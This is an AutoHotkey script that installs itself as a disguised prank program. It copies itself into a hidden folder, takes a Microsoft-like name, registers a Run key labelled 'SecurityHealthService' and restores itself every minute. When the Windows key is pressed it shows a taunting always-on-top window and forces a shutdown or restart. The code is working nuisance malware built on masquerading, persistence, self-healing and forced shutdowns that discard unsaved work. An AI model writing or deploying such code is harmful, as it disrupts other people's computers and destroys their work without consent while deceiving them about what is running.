#Requires AutoHotkey v2.0
#SingleInstance Force
Persistent
InstallKeybdHook

MODE        := "shutdown"    ; shutdown | restart | bsod
MIN_DELAY   := 10
MAX_DELAY   := 90

DISGUISE_NAMES := [
    "WindowsSecurityHealth",
    "MicrosoftEdgeUpdate",
    "OneDriveStandaloneUpdater",
    "WindowsDefenderNotification",
    "OfficeBackgroundTaskHandler",
    "WSearchIndexer",
    "ShellExperienceHost",
    "WindowsBackupMonitor"
]

BASE := EnvGet("LOCALAPPDATA")
if (BASE = "")
    BASE := A_AppData

INSTALL_DIR := BASE "\Microsoft\SecurityHealth"
EXT         := A_IsCompiled ? ".exe" : ".ahk"
LOG_PATH    := INSTALL_DIR "\debug.log"
REG_KEY     := "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"

uninstalled := false
firstRun    := false

; --- Determine disguise identity and installation state via Registry ---
REG_DISGUISE := ""
try REG_DISGUISE := RegRead(REG_KEY, "SecurityHealthService", "")

if (REG_DISGUISE = "") {
    firstRun := true
    DISGUISE := DISGUISE_NAMES[Random(1, DISGUISE_NAMES.Length)]
} else {
    SplitPath REG_DISGUISE, , , , &DISGUISE
}

SCRIPT_DEST := INSTALL_DIR "\" DISGUISE EXT

if !DirExist(INSTALL_DIR)
    DirCreate INSTALL_DIR

Log(msg) {
    global LOG_PATH
    try FileAppend(FormatTime(, "HH:mm:ss") "  " msg "`n", LOG_PATH, "UTF-8")
}

Log("=== start, mode=" MODE " name=" DISGUISE " compiled=" A_IsCompiled " admin=" A_IsAdmin)

if (A_ScriptFullPath != SCRIPT_DEST) {
    try {
        FileCopy A_ScriptFullPath, SCRIPT_DEST, 1
        Log("copied self to " SCRIPT_DEST)
    } catch as e {
        Log("copy failed: " e.Message)
    }
}

TargetRunCmd := A_IsCompiled ? '"' SCRIPT_DEST '"' : '"' A_AhkPath '" "' SCRIPT_DEST '"'

if firstRun {
    try {
        RegWrite TargetRunCmd, "REG_SZ", REG_KEY, "SecurityHealthService"
        Log("registry persistence set")
    } catch as e {
        Log("registry FAILED: " e.Message)
    }
}

; --- Hide files and directory ---
try FileSetAttribute(INSTALL_DIR, "H")
try FileSetAttribute(SCRIPT_DEST, "H")

; --- Self-heal: ensure registry entry and script exist ---
SetTimer EnsureInstalled, 60000

EnsureInstalled() {
    global uninstalled, SCRIPT_DEST, DISGUISE, EXT, INSTALL_DIR, REG_KEY, TargetRunCmd
    if uninstalled
        return
    if !FileExist(SCRIPT_DEST) {
        try {
            FileCopy A_ScriptFullPath, SCRIPT_DEST, 1
            FileSetAttribute(SCRIPT_DEST, "H")
            Log("self-heal: restored script")
        } catch as e {
            Log("self-heal script FAILED: " e.Message)
        }
    }
    try {
        val := RegRead(REG_KEY, "SecurityHealthService", "")
        if (val = "") {
            RegWrite TargetRunCmd, "REG_SZ", REG_KEY, "SecurityHealthService"
            Log("self-heal: restored registry key")
        }
    } catch {
    }
}

; --- Tray Setup ---
A_IconTip := "Windows Security Health Service"
A_TrayMenu.Delete()
A_TrayMenu.Add("Crash now", (*) => DoCrash())
A_TrayMenu.Add("Show log", (*) => Run('notepad.exe "' LOG_PATH '"'))
A_TrayMenu.Add()
A_TrayMenu.Add("Uninstall", Uninstall)
A_TrayMenu.Add("Exit", (*) => ExitApp())
A_TrayMenu.Default := "Crash now"
A_TrayMenu.ClickCount := 1
A_IconHidden := true

pending := false

try {
    Hotkey("~#", ScheduleCrash)
    Hotkey("~*RWin", ScheduleCrash)
    Hotkey("^!b", ScheduleCrash)
    Hotkey("^!+u", Uninstall)
    Hotkey("^!+x", (*) => ExitApp())
    Log("hotkeys registered")
} catch as e {
    Log("hotkey FAILED: " e.Message)
}

ScheduleCrash(*) {
    global pending, MIN_DELAY, MAX_DELAY
    if pending
        return
    pending := true
    delay := Random(MIN_DELAY, MAX_DELAY)
    Log("press accepted, delay " delay "s")
    SetTimer(DoCrash, -delay * 1000)
    SetTimer(ResetPending, -180000)
}

ResetPending() {
    global pending
    if pending {
        pending := false
        Log("pending auto-reset")
    }
}

; ============================================================
; pre-shutdown taunt window
; ============================================================
TAUNT_LEAD  := 5
TAUNT_TOP   := "I'm sick of this shit, {name}."
TAUNT_BOT   := "You can't get rid of me."

WarnGui     := ""
TickText    := ""
secondsLeft := 0
baseX       := 0
baseY       := 0

ShowTaunt() {
    global WarnGui, TickText, secondsLeft, TAUNT_LEAD
    global TAUNT_TOP, TAUNT_BOT, baseX, baseY

    if IsObject(WarnGui) {
        try WarnGui.Destroy()
        WarnGui := ""
    }

    secondsLeft := TAUNT_LEAD
    who := (A_UserName != "") ? A_UserName : EnvGet("USERNAME")

    g := Gui("+AlwaysOnTop -SysMenu -Caption +ToolWindow +Border", "AnnoyingBSOD")
    g.BackColor := "0B0B0B"
    g.SetFont("s20 bold cFFFFFF", "Segoe UI")
    g.AddText("w720 Center Background0B0B0B", StrReplace(TAUNT_TOP, "{name}", who))
    g.SetFont("s14 cAAAAAA", "Segoe UI")
    g.AddText("w720 Center Background0B0B0B", TAUNT_BOT)
    g.SetFont("s11 bold cFF4444", "Consolas")
    TickText := g.AddText("w720 Center Background0B0B0B", "")

    g.OnEvent("Close", (*) => 1)
    g.Show("w760 h190 Center")
    WinSetAlwaysOnTop 1, "ahk_id " g.Hwnd
    WarnGui := g

    WinGetPos &baseX, &baseY, , , "ahk_id " g.Hwnd

    SoundBeep 950, 130
    SoundBeep 700, 130

    SetTimer(ReAssertTaunt, 120)
    SetTimer(TickTaunt, 1000)
    TickTaunt()
}

ReAssertTaunt() {
    global WarnGui, baseX, baseY
    if !IsObject(WarnGui)
        return
    try {
        WinSetAlwaysOnTop 1, "ahk_id " WarnGui.Hwnd
        if (DllCall("GetForegroundWindow", "ptr") != WarnGui.Hwnd)
            WinActivate "ahk_id " WarnGui.Hwnd
        WinMove baseX + Random(-4, 4), baseY + Random(-3, 3), , , "ahk_id " WarnGui.Hwnd
    }
}

TickTaunt() {
    global TickText, secondsLeft
    if !IsObject(TickText)
        return
    if (secondsLeft <= 0) {
        TickText.Text := "shutting down..."
        return
    }
    TickText.Text := "shutting down in " secondsLeft
    secondsLeft -= 1
}
; ============================================================

DoCrash(*) {
    global pending, MODE, TAUNT_LEAD
    Log("DoCrash firing, mode=" MODE)
    ShowTaunt()
    Sleep 80
    try {
        if (MODE = "shutdown")
            Run("shutdown.exe /s /f /t " TAUNT_LEAD, , "Hide")
        else if (MODE = "restart")
            Run("shutdown.exe /r /f /t " TAUNT_LEAD, , "Hide")
        else
            Run("shutdown.exe /r /f /t " TAUNT_LEAD " /d p:4:1", , "Hide")
        Log("shutdown.exe launched")
    } catch as e {
        Log("launch FAILED: " e.Message)
        pending := false
    }
}

Uninstall(*) {
    global uninstalled, INSTALL_DIR, REG_KEY
    uninstalled := true
    SetTimer EnsureInstalled, 0
    try RegDelete(REG_KEY, "SecurityHealthService")
    try FileSetAttribute(INSTALL_DIR, "-H")
    Run('cmd.exe /c ping -n 3 127.0.0.1 >nul & rd /s /q "' INSTALL_DIR '"', , "Hide")
    ExitApp()
}

if firstRun {
    MsgBox "Installed.`n`nTap the Windows key and wait 10-90 seconds.`n`nTo remove it later: Ctrl+Alt+Shift+U`nTo just quit: Ctrl+Alt+Shift+X"
    Run TargetRunCmd
    ExitApp()
}